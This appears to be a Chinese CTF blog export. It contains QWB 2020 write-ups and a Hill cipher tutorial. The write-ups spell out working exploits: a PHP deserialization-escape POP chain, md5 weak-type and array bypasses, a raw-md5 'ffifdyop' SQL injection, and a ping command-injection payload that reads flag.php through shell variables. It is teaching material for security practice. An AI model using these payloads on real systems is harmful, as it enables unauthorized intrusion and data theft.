\u003c?php $obj = new midsolo(); $obj(); ?\u003e 最后 __wakeup() 中，给 $this-\u003ename 赋了值，如果 想让$this-\u003ename为jungle类对象的话，就得绕过__wakeup() topsolo类：调用midsolo类对象 的类 TP()：判断 $this-\u003ename 是否为 function 或 object ，并且去执行它 __destruct()：析构方法，会调用 TP() 在 topsolo 类中，关键点就在于 TP()，会去执行 $this-\u003ename()，根据上面 midsolo 类的分析，如果 $this-\u003ename赋值为 midsolo 类对象，那么就可调用 midsolo 类的 __invoke() 与 Gank() player类：可以实际控制的类 player 为入口类，两个成员变量可控制，可以将成员变量赋值为 topsolo 类对象，这样就能依次调用上面的类方法了 根据上面的分析，其实已经可以看出点端倪了，可以根据上面的类来构造一个POP链，获取flag，如下： \u003c?php @error_reporting(0); require_once \"common.php\"; require_once \"class.php\"; $jungle = new jungle(); $midsolo = new midsolo($jungle); $topsolo = new topsolo($midsolo); $player = new player('aaa', $topsolo); ?\u003e 最后的common.php，存在三个方法：read()、write()、check() \" 其中 write() 在序列化的时候调用，将0x00*0x00替换成\\0*\\0，而 read() 则相反，在反序列化的时候调用，将\\0*\\0替换成0x00*0x00，而 check() 也是在反序列化的时候调用，检查反序列化的数据是否存在name字段。其实看到这里，已经可以发现 write() 与 read() 存在 反序列化逃逸 的漏洞，这里我们先简单学习下 反序列化逃逸 的知识点。 首先，PHP 在反序列化时，会根据变量的类型来生成变量，如果是字符串类型，还会根据长度来生成字符串。而如果长度值超出了后面的定义的字符串的话，PHP 会继续向后取内容，直到取满相同长度的字符。这样说的可能有点抽象，举个例子演示一下： \u003c?php class A{ public $name; public $age; public function __construct($name, $age){ $this-\u003ename = $name; $this-\u003eage = $age; } } $A = new A('xiaoming', 18); var_dump($A); echo '\u003chr\u003e'; $str = serialize($A); echo $str; echo '\u003chr\u003e'; $str = substr_replace($str,'26',24,1); $str .= '\";s:3:\"age\";s:8:\"xiaoming\";}'; echo $str; echo '\u003chr\u003e'; var_dump( unserialize($str)); ?\u003e 执行结果如下： \" 我们最初定义name = 'xiaoming'，age = 18，在经过序列化并对序列化数据进行了改变，再次反序列化回来的时候值都被改变了，特别是age，连类型都改变了，这是为什么呢？ 在输出的第三行中，可以看到s:8被改成了s:26。这是什么意思呢？这代表name成员是一个字符串类型，并且字符串的长度是 26。 当 PHP 收到修改后的数据后，读取到 26 时，就真的会以 26 的长度去读取内容赋值给 name成员，所以说最后name变成了xiaoming\";s:3:\"age\";i:18;}，将之前的age的定义当成了name的值。而读取了name的内容之后，PHP 会继续反序列化，读取到我们自己构造的数据，于是将age赋值成了xiaoming。 再次回过头来看 write() 与 read()，它们的内容中都有\\0*\\0与0x00*0x00，这两段字符串的区别是长度不同，\\0*\\0长度为 5，而0x00*0x00长度为 3，可用如下代码做个实验： \u003c?php echo strlen($_GET['a']); echo '\u003cbr /\u003e'; echo strlen($_GET['b']); ?\u003e 访问?a=\\0*\\0\u0026b=%00*%00得到结果如下： \" 而read()将\\0*\\0替换成0x00*0x00，那么替换后的字符串会比原字符串少2个字符，于是产生了漏洞。这里为了说得清楚一些，用player来做个实验： \u003c?php @error_reporting(0); require_once \"common.php\"; require_once \"class.php\"; $player = new player($_GET['a'], $_GET['b']); $ser = serialize($player); echo $ser; // 序列化时 echo '\u003cbr /\u003e\u003chr\u003e'; $ser = write($ser); echo $ser; // write时 echo '\u003cbr /\u003e\u003chr\u003e'; $ser = read($ser); echo $ser; // read时 echo '\u003cbr /\u003e\u003chr\u003e'; var_dump( unserialize($ser)); // 反序列化时 echo '\u003cbr /\u003e\u003chr\u003e'; ?\u003e 访问?a=\\0*\\0\u0026b=123，如下： \" 在序列化时，user参数的值为\\0*\\0，长度为5，而经过write()方法后，user参数的值和长度未发生任何变化，因为值中不包含0x00*0x00，所以不会进行替换。 而在经过read()后，因为user参数的值中包含\\0*\\0，于是值被替换成了0x00*0x00，但长度并没有改变，依然还是5，PHP 会以 5 的长度来读取字符串，但实际上0x00*0x00的长度只有 3，于是 PHP 继续向后读取，把\";也当成了字符串的一部分，然后继续反序列化，因为\"被当成了字符串，后面没有\"了，导致闭合失败，最终反序列化失败。 通过这种方式，就可以像之前的例子一样，靠长度不一致的问题，把反序列化中原本的对象信息给当成字符串，而自己再构造相应的数据，来达到修改对象中其他成员变量的值。 最后总结下上面的分析： 获取flag，需要通过POP链 在play.php文件中，反序列化player类对象时存在反序列化逃逸，利用这点可以构造POP链的类信息 受控制的参数为player类对象的user和pass，利用username参数把user成员填充为\\0*\\0的形式，用来反序列化逃逸，利用password的参数把pass成员构造成POP链类对象，用来获取flag 一步一步来，先把上面的POP链的反序列化信息生成出来，如下： O:6:\"player\":3:{s:7:\"0x00*0x00user\";s:3:\"aaa\";s:7:\"0x00*0x00pass\";O:7:\"topsolo\":1:{s:7:\"0x00*0x00name\";O:7:\"midsolo\":1:{s:7:\"0x00*0x00name\";O:6:\"jungle\":1:{s","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:2:0","tags":["强网杯"],"title":"强网杯2020部分WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"强网先锋——Funhash 这道题主要考的是 PHP 中，关于弱类型比较与 md5() 相关的漏洞，如果接触得比较多的话，一下就应该做出来了，下面有两个参考链接，光看这两个链接都能把题做出来。我这里由于是第一次碰到这个题，所以还是记录下过程。 源码如下： \u003c?php include 'conn.php'; highlight_file(\"index.php\"); //level 1 if ($_GET[\"hash1\"] != hash(\"md4\", $_GET[\"hash1\"])) { die('level 1 failed'); } //level 2 if($_GET['hash2'] === $_GET['hash3'] || md5($_GET['hash2']) !== md5($_GET['hash3'])) { die('level 2 failed'); } //level 3 $query = \"SELECT * FROM flag WHERE password = '\" . md5($_GET[\"hash4\"],true) . \"'\"; $result = $mysqli-\u003equery($query); $row = $result-\u003efetch_assoc(); var_dump($row); $result-\u003efree(); $mysqli-\u003eclose(); ?\u003e 首先来看level 1，需要hash1 与 md4(hash1) 相等，看到这里我第一想法是不可能，这机率太小了，然后还是写了个脚本爆破了一晚上，不出意外没有结果。第二天，网上搜资料的时候，才发现这里用的判断是!=，结合 PHP 的弱类型比较一搜，果然这里有猫腻，经过测试发现，只要满足0e+数字，后面的数字无论怎么变都是相等的，所以只需要构造hash1是0e+数字的格式，并且md4(hash1)的结果也是0e+数字的格式即可。于是再次构造脚本爆破，这里思路正确了，但是脚本构造的有问题，如下： import hashlib import string import itertools from Crypto.Hash import MD4 data = string.digits string.ascii_letters for i in range(1,33): for i in itertools.product(data,repeat=i): str = bytes(\"\".join(('0e',)+i),'utf8') h = MD4.new() h.update(str) md4str = h.hexdigest() if md4str.startswith('0e') and md4str.isnumeric(): print('it\\'s find!') print('str:%s, md5str:%s'%(str, md4str)) exit() 我这里想的是构造 1 ~ 32 位的字符，依次慢慢增加位数爆破，类似于笛卡尔积的模式，其实这样思路没有问题，最后肯定是能爆破出来的，只是时间有点长，在这里等了几个小时，发现没有结果，以为自己的思路有问题，于是咨询了下大佬，大佬丢了个脚本过来，如下： import hashlib import re prefix = '0e' def breakit(): iters = 0 while 1: s = (prefix + str(iters)).encode('utf-8') hashed_s = hashlib.new('md4', s).hexdigest() iters = iters + 1 r = re.match('^0e[0-9]{30}', hashed_s) if r: print (\"[+] found! md4( {} ) ---\u003e {}\".format(s, hashed_s)) print (\"[+] in {} iterations\".format(iters)) exit(0) breakit() 大佬的脚本就是从 1 开始，依次 +1，然后加上前缀 0e 进行爆破。这样的方式其实并不算完美，会漏掉一些字符串，例如01。不过这道题的确是得这样做，在跑了 10 多分钟之后，就找到结果了： image-20200823201411637 \" 接着再来看level 2，在level 2，没有使用到==与!=，所以无法利用上面的方式进行绕过，在这里网上搜索了资料，得知 PHP 的md5()无法处理数组，当构造hash2[]=1\u0026hash3[]=2，即可绕过这里的判断。 最后来看level 3，这里是我第一眼看到题目时觉得最难的地方，前面两个都是进行有目的的哈希碰撞，这里完全没有目标，所以这里我没有做出来，最后问了大佬，大佬提醒我说 PHP 的 md5()函数第二个参数为true时，会产生漏洞。我拿着这信息去搜索了下，找到了相关的信息，大概就是当 md5()函数第二个参数为true时，该函数返回的是哈希值的16字符的二进制格式，如下： image-20200823192324995 \" 第一处，是md5('b',false)的结果，这里返回的就是 32 字节的ascii形式的哈希值，而第二处，是md5('b',true)的结果，可以看到前面几个字节与第一处是一样的，相当于是第一处的二进制格式。在第二处的右边可以看到，这几个二进制数据，转化为ascii码之后，变成了'or'xxx，如果将这几个字符与页面上的SQL语句拼接的话，就形成了下面的语句： $query = \"SELECT * FROM flag WHERE password = '\" . \"'or'xxx\" . \"'\"; 而在MySQL中，or后面只要不为0，即为真，所以这里相当于造成了SQL注入，于是就满足了查询条件，得到了flag，如下： image-20200823185538378 \" Payload：?hash1=0e251288019\u0026hash2[]=1\u0026hash3[]=2\u0026hash4=ffifdyop 参考链接： https://blog.csdn.net/zz_Caleb/article/details/84947371 https://www.cnblogs.com/piaomiaohongchen/p/10659359.html ","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:3:0","tags":["强网杯"],"title":"强网杯2020部分WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"强网先锋——upload 下载题目附件，可看到是一个数据包data.pcapng，用Wireshark打开，可看到都是HTTP的数据： image-20200823171355987 \" 右键追踪流 ==\u003e TCP流，在第 2 个流中，可看到上传了一张名为steghide.jpg的图片，如下： image-20200823171328459 \" 将图片数据提取出来，保存成图片文件，如下： image-20200823172650758 \" 从上传的数据包里可看见，上传的文件名为steghide.jpg，猜测与隐写工具steghide有关，于是用steghide查看一下文件信息： image-20200823173123927 \" 发现有密码，随手一测123456，发现密码正确： image-20200823173238110 \" 于是提取flag.txt，得到flag： image-20200823173322237 \" 参考链接：http://www.safe6.cn/article/102 ","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:4:0","tags":["强网杯"],"title":"强网杯2020部分WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"强网先锋——红方辅助 下载附件，得到两个文件client.py、enc.pcapng 先来看client.py，该脚本就是读取文件并且加密后发送给服务器，主要逻辑如下： image-20200824022220030 \" 打开文件并读取每一行数据 发送G到服务端 接收 4 字节服务端发来的数据 将每一行数据、接收到的 4 字节数据、计数变量一起传递给加密函数，得到两个值，data为加密后的数据 将刚才得到的数据发送给服务端 获取 4 字节服务端发来的数据，并与计数变量进行比较 从上面的流程可以看到，与服务端交互的过程是发送 ==\u003e 接收 ==\u003e 发送 ==\u003e 发送 ==\u003e 接收 现在再来看enc.pcapng，打开之后右键选择追踪流 ==\u003e TCP流，在第 2 个流中可看到大量加密后的数据，如下： image-20200824022849106 \" 可以看到其中有很多G，可以判断这就是发送的数据包，在这里我们将流显示为原始数据，看得更清晰： image-20200824023035570 \" 可以很清晰地看出，这就是每一次发送接收的数据流，与之前分析的过程一模一样，都是发送 ==\u003e 接收 ==\u003e 发送 ==\u003e 发送 ==\u003e 接收： image-20200824023322550 \" 经过分析，服务端发送来的数据btime为时间戳，而pcount则是和计数变量一致的内容 接下来再来分析加密函数，如下： image-20200824023602505 \" 其中返回的boffset是offset变量中的其中一个，这个通过观察流量包也能看出来，永远都是三个之中的一个。 enc则是将一堆算出来的值，合在一起的东西。 在这个题中，我们主要是要知道它传输的内容到底是什么，也就是加密函数的形参data，而在加密函数的 37 行这里，将data一个一个取出来，进行一顿异或和模之后，得到的结果给enc并传送给服务端。也就是说现在我们手上有加密的数据，加密的算法，现在需要写出解密算法，来将加密数据给解密出来。 首先来看加密函数的 35 行，这里是enc首次被打包赋值，这几个值是解密的关键，而且这几个值没有被加密，可以从数据中得到。先来看看这个打包的格式\u003cIIcB，\u003c代表用小端存储，I代表int型，占 4 字节，c代表char型，占 1 字节，B代表unsigned char，占 1 字节。而在第一次的数据包中就对应如下这几个字节： image-20200824024653953 \" 转换回来的话就是： enc = struct.pack(\"\u003cIIcB\", 0, 132, '0', 14) 而下面的加密循环就变成了这样： i = 0 for c in data: enc += chr((funcs['0'.decode()](ord(c) ^ ord(t[i]), 14) % 256)) i = (i + 1) % 4 其中的t也是能从数据包中找到的，所以最后就只剩c不知道，也就是data的每一个字符不知道是啥。 求c怎么求呢，因为加密数据包已经知道了，所以它每次加密后的结果是知道的，例如第一个是a4，那么chr((funcs['0'.decode()](ord(c) ^ ord(t[i]), 14) % 256)) = 0xa4，在这种表达式下，c的值肯定是0 ~ 255之间的一个值，为什么呢，因为它是data中的字符啊，而data是可以显示的字符串，所以它的每一个字符都是可显示的，那么就肯定是0 ~ 255的值，这时就可以进行枚举c，从0 ~255中枚举，哪一个满足这个表达式那么c就为那个。 有了上面的思路，就可以写脚本了，先将数据包里的原始数据保存成data.txt，然后运行脚本： import struct def decrypt(data, btime, fn, salt): funcs = { \"0\": lambda x, y: x - y, \"1\": lambda x, y: x + y, \"2\": lambda x, y: x ^ y } offset = { \"0\": 0xefffff, \"1\": 0xefffff, \"2\": 0xffffff, } t = struct.unpack(\"\u003ci\", btime)[0] boffset = offset[fn.decode()] t -= boffset t = struct.pack(\"\u003ci\", t) i = 0 for c in data: for ss in range(0, 256): if (funcs[fn.decode()](ss ^ t[i], salt) % 256) == c: print(chr(ss), end='') break i = (i + 1) % 4 f = open(\"data.txt\", \"r\") readlines = f.readlines() f.close() for i in range(0,len(readlines),5): data = readlines[i+3] btime = bytes.fromhex(readlines[i+1][:-1]) fn = bytes.fromhex(data[16:18]) salt = ord(bytes.fromhex(data[18:20])) data = bytes.fromhex(data[20:-1]) decrypt(data, btime, fn, salt) 最后运行的结果如下， 把每一个字符提出来加上QWB{}就得到flag： image-20200824030245817 \" ","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:5:0","tags":["强网杯"],"title":"强网杯2020部分WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"强网先锋——主动 打开链接得到源码： \u003c?php highlight_file(\"index.php\"); if(preg_match(\"/flag/i\", $_GET[\"ip\"])) { die(\"no flag\"); } system(\"ping -c 3 $_GET[ip]\"); ?\u003e 很基础的命令执行，先查看当前目录下的文件： image-20200823173950037 \" 可看到flag.php在当前目录下，但是因为上面的正则表达式无法直接读取文件，这里利用 Linux 的变量机制来绕过正则： image-20200823175004665 \" Payload：?ip=8.8.8.8;a=\"fla\";b=\"g.php\";cat%20\"./\"$a$b 链接 相关题目：强网杯2020WriteUp相关题目.zip ","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:6:0","tags":["强网杯"],"title":"强网杯2020部分WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"Hill Cipher","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":" 由于工作需要，接触了CTF的Crypto类型的题目，是一道关于希尔密码的题目，由于没有玩过这类题目，于是将过程记录下来做个笔记。 ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:0:0","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"1. 希尔密码概要 简单的介绍下希尔密码。希尔密码属于古典密码，是运用矩阵原理的替换密码，发明者为 Lester S. Hill，发明时间是 1929 年。希尔密码在加解密过程中会大量使用到线性代数中的矩阵知识，所以对数学能力要求会高一点。下面是学习希尔密码的一些前提知识点： 希尔密码维基百科：https://en.wikipedia.org/wiki/Hill_cipher 互质：https://baike.baidu.com/item/%E4%BA%92%E8%B4%A8 矩阵：https://www.shuxuele.com/algebra/matrix-introduction.html 矩阵乘法：https://www.shuxuele.com/algebra/matrix-multiplying.html 矩阵的行列式：https://www.shuxuele.com/algebra/matrix-determinant.html 逆矩阵：https://www.shuxuele.com/algebra/matrix-inverse.html 伴随矩阵：https://en.wikipedia.org/wiki/Adjugate_matrix 模逆元：https://en.wikipedia.org/wiki/Modular_multiplicative_inverse 上面这些参考链接，都可以看看，希尔密码的加解密都会涉及到这些。对于维基百科的东西，建议都看英文版，中文版写得太烂，完全不知道写的啥玩意儿。 ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:1:0","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"2. 希尔密码的加密 先来学习希尔密码的加密步骤。 ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:2:0","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"前提准备 在加密开始之前，首先得准备一些东西： 替换表：希尔密码属于替换密码，所以必须得先有一张替换表，这里设置的替换表如下 \\[ \\begin{array}{cc} a \u0026 b \u0026 c \u0026 d \u0026 e \u0026 f \u0026 g \u0026 h \u0026 i \u0026 j \u0026 k \u0026 l \u0026 m \u0026 n \\\\ 0 \u0026 1 \u0026 2 \u0026 3 \u0026 4 \u0026 5 \u0026 6 \u0026 7 \u0026 8 \u0026 9 \u0026 10 \u0026 11 \u0026 12 \u0026 13 \\end{array} \\] \\[ \\begin{array}{cc} o \u0026 p \u0026 q \u0026 r \u0026 s \u0026 t \u0026 u \u0026 v \u0026 w \u0026 x \u0026 y \u0026 z \\\\ 14 \u0026 15 \u0026 16 \u0026 17 \u0026 18 \u0026 19 \u0026 20 \u0026 21 \u0026 22 \u0026 23 \u0026 24 \u0026 25 \\end{array} \\] 密钥矩阵的维数：希尔密码的加解密都是依靠密钥矩阵的，规定密钥矩阵需为方块矩阵，也就是n x n的矩阵，需第一时间确定n的值。这里设置密钥矩阵为 2 维矩阵，也就是 2 x 2的矩阵 明文信息：这里设置明文信息为helloworld 密钥信息：这里设置密钥为hill 在这里还有个步骤，就是需要校验密钥是否可逆，后面会专门讲这个点 ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:2:1","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"矩阵转换 首先先将密钥信息转换为密钥矩阵。转换密钥矩阵时，需要根据最初设置的密钥矩阵维数来进行转换，将密钥以横向的方式依次变换成矩阵，如下： \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\] 在密钥转换成密钥矩阵时，需要注意两点： 密钥是横向填充到矩阵中的 如果密钥的长度不够填充密钥矩阵时，需用替换表中的字母依次填充。如果密钥的长度超出矩阵数量时，则只取相应长度的密钥填充即可 举例： 密钥矩阵的维度设置为 2，密钥为ice，替换表还是上面那个。因为密钥长度不够填充矩阵，需要用替换表中的字符来补足，如下： \\[ \\begin{pmatrix} i \u0026 c \\\\ e \u0026 a \\end{pmatrix} \\] 密钥矩阵的维度设置为 2，密钥为green，替换表还是上面那个。因为密钥长度超出了矩阵数量，所以只截取相应的长度，如下： \\[ \\begin{pmatrix} g \u0026 r \\\\ e \u0026 e \\end{pmatrix} \\] 得到转换后的密钥矩阵之后，需要将其按照替换表替换为数字型的密钥矩阵，如下： \\[ \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\] 得到密钥矩阵之后，现在来进行明文的矩阵转换。明文的矩阵，行数需和密钥矩阵维度相同，并且是以纵向的方式进行矩阵填充的，如下： \\[ \\begin{pmatrix} h \u0026 l \u0026 o \u0026 o \u0026 l \\\\ e \u0026 l \u0026 w \u0026 r \u0026 d \\end{pmatrix} \\] 在明文转换成矩阵时，需要注意两点： 明文是纵向填充到矩阵中的 如果明文的长度不够填充矩阵时，需要用x补足 举例： 密钥矩阵的维度设置为 2，明文为hello，替换表还是上面那个。因为明文长度不够填充矩阵，需要用x来补足，如下： \\[ \\begin{pmatrix} h \u0026 l \u0026 o \\\\ e \u0026 l \u0026 x \\end{pmatrix} \\] 将明文矩阵转换为数字型的明文矩阵，如下： \\[ \\begin{pmatrix} 7 \u0026 11 \u0026 14 \u0026 14 \u0026 11 \\\\ 4 \u0026 11 \u0026 22 \u0026 17 \u0026 3 \\end{pmatrix} \\] 由此，两个需要的矩阵都有了之后，现在可以正式开始进行加密了。 ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:2:2","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"正式加密 希尔密码加密，需要用密钥矩阵与明文矩阵的每一个列向量(column vector)相乘，所以先将明文矩阵分割成列向量的形式，如下： \\[ \\begin{pmatrix} 7 \\\\ 4 \\end{pmatrix} \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 22 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 17 \\end{pmatrix} \\begin{pmatrix} 11 \\\\ 3 \\end{pmatrix} \\] 然后将密钥矩阵和每一个列向量相乘，如与第一个列向量相乘，就像这样： \\[ \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 4 \\end{pmatrix} \\] 而相乘的方式就是矩阵的乘法方式，2 x 2的矩阵乘法如下： \\[ \\begin{pmatrix} a \u0026 b \\\\ c \u0026 d \\end{pmatrix} \\begin{pmatrix} x \\\\ y \\end{pmatrix} = \\begin{pmatrix} ax \u0026 + \u0026 by \\\\ cx \u0026 + \u0026 dy \\end{pmatrix} \\] 转换为密钥和列向量的话，就像下面这样： \\[ \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 4 \\end{pmatrix} = \\begin{pmatrix} 7\\times7 \u0026 + \u0026 8\\times4 \\\\ 11\\times7 \u0026 + \u0026 11\\times4 \\end{pmatrix} = \\begin{pmatrix} 81 \\\\ 121 \\end{pmatrix} \\] 得到相乘后的结果之后，再将其与 26 相模，如下： \\[ \\begin{pmatrix} 81 \\\\ 121 \\end{pmatrix} \\equiv \\begin{pmatrix} 3 \\\\ 17 \\end{pmatrix} \\mod 26 \\] 最后将数字转换成替换表中的字符即可，如下： \\[ \\begin{pmatrix} 3 \\\\ 17 \\end{pmatrix} = \\begin{pmatrix} d \\\\ r \\end{pmatrix} \\] ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:2:3","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"最终结果 根据上面的加密步骤，计算出所有的密文，如下： \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\begin{pmatrix} h \\\\ e \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 4 \\end{pmatrix} \\equiv \\begin{pmatrix} 7\\times7 \u0026 + \u0026 8\\times4 \\\\ 11\\times7 \u0026 + \u0026 11\\times4 \\end{pmatrix} \\equiv \\begin{pmatrix} 81 \\\\ 121 \\end{pmatrix} \\equiv \\begin{pmatrix} 3 \\\\ 17 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} d \\\\ r \\end{pmatrix} \\] \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\begin{pmatrix} l \\\\ l \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\equiv \\begin{pmatrix} 7\\times11 \u0026 + \u0026 8\\times11 \\\\ 11\\times11 \u0026 + \u0026 11\\times11 \\end{pmatrix} \\equiv \\begin{pmatrix} 165 \\\\ 242 \\end{pmatrix} \\equiv \\begin{pmatrix} 9 \\\\ 8 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} j \\\\ i \\end{pmatrix} \\] \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\begin{pmatrix} o \\\\ w \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 22 \\end{pmatrix} \\equiv \\begin{pmatrix} 7\\times14 \u0026 + \u0026 8\\times22 \\\\ 11\\times14 \u0026 + \u0026 11\\times22 \\end{pmatrix} \\equiv \\begin{pmatrix} 274 \\\\ 396 \\end{pmatrix} \\equiv \\begin{pmatrix} 14 \\\\ 6 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} o \\\\ g \\end{pmatrix} \\] \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\begin{pmatrix} o \\\\ r \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 7\\times14 \u0026 + \u0026 8\\times17 \\\\ 11\\times14 \u0026 + \u0026 11\\times17 \\end{pmatrix} \\equiv \\begin{pmatrix} 234 \\\\ 341 \\end{pmatrix} \\equiv \\begin{pmatrix} 0 \\\\ 3 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} a \\\\ d \\end{pmatrix} \\] \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\begin{pmatrix} l \\\\ d \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 11 \\\\ 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 7\\times11 \u0026 + \u0026 8\\times3 \\\\ 11\\times11 \u0026 + \u0026 11\\times3 \\end{pmatrix} \\equiv \\begin{pmatrix} 101 \\\\ 154 \\end{pmatrix} \\equiv \\begin{pmatrix} 23 \\\\ 24 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} x \\\\ y \\end{pmatrix} \\] 最后，明文为helloworld，密钥为hill的情况下，希尔密码加密后得到的密文为drjiogadxy。 ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:2:4","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"3. 希尔密码的解密 现在来学习希尔密码的解密步骤，相对于加密来说，希尔密码的解密会稍微难一些。 ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:3:0","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"前提准备 和加密一样，在解密之前，需要准备一些东西，与加密准备的东西差不多，如下： 替换表：同加密一样，解密同样需要一张替换表，并且需要和加密时的一致，如下 \\[ \\begin{array}{cc} a \u0026 b \u0026 c \u0026 d \u0026 e \u0026 f \u0026 g \u0026 h \u0026 i \u0026 j \u0026 k \u0026 l \u0026 m \u0026 n \\\\ 0 \u0026 1 \u0026 2 \u0026 3 \u0026 4 \u0026 5 \u0026 6 \u0026 7 \u0026 8 \u0026 9 \u0026 10 \u0026 11 \u0026 12 \u0026 13 \\end{array} \\] \\[ \\begin{array}{cc} o \u0026 p \u0026 q \u0026 r \u0026 s \u0026 t \u0026 u \u0026 v \u0026 w \u0026 x \u0026 y \u0026 z \\\\ 14 \u0026 15 \u0026 16 \u0026 17 \u0026 18 \u0026 19 \u0026 20 \u0026 21 \u0026 22 \u0026 23 \u0026 24 \u0026 25 \\end{array} \\] 密钥矩阵的维数：需与加密时的一致，设置密钥矩阵为 2 维矩阵，也就是 2 x 2的矩阵 密文信息：注意这里设置的是密文信息，也就是刚才加密得到的drjiogadxy 密钥信息：需与加密时的一致，设置密钥为hill ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:3:1","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"密文矩阵转换 这里先将密文转换成矩阵，并且分割成列向量的形式，如下： \\[ \\begin{pmatrix} d \u0026 j \u0026 o \u0026 a \u0026 x \\\\ r \u0026 i \u0026 g \u0026 d \u0026 y \\end{pmatrix} = \\begin{pmatrix} 3 \u0026 9 \u0026 14 \u0026 0 \u0026 23 \\\\ 17 \u0026 8 \u0026 6 \u0026 3 \u0026 24 \\end{pmatrix} = \\begin{pmatrix} 3 \\\\ 17 \\end{pmatrix} \\begin{pmatrix} 9 \\\\ 8 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 6 \\end{pmatrix} \\begin{pmatrix} 0 \\\\ 3 \\end{pmatrix} \\begin{pmatrix} 23 \\\\ 24 \\end{pmatrix} \\] ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:3:2","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"求取逆矩阵 在解密过程中，最重要的一步就是求密钥矩阵的逆矩阵，求得了逆矩阵之后，其余步骤就和加密步骤没什么区别了。需要注意的是，这里指的逆矩阵不是一般的逆矩阵，与平时提到的逆矩阵大不相同，计算方式也完全不一样。 一般逆矩阵的计算公式如下： \\[ A^{-1} = { \\frac {A^{*}}{|A|} } = { \\frac 1{|A|} } \\times A^{*} \\] 其中 $ A $ 为矩阵，$ A^{-1} $ 为 $ A $ 的逆矩阵，$ A^{*} $ 为 $ A $ 的伴随矩阵，$ {|A|} $ 为 $ A $ 的行列式。 而希尔密码密钥矩阵的逆矩阵计算公式如下： \\[ K^{-1} = d^{-1} \\times adj(K) \\] 其中 $ K $ 为密钥矩阵，$ K^{-1} $ 为 $ K $ 的逆矩阵，$ d $ 为 $ K $ 的行列式，$ adj(K) $ 为 $ K $ 的伴随矩阵。 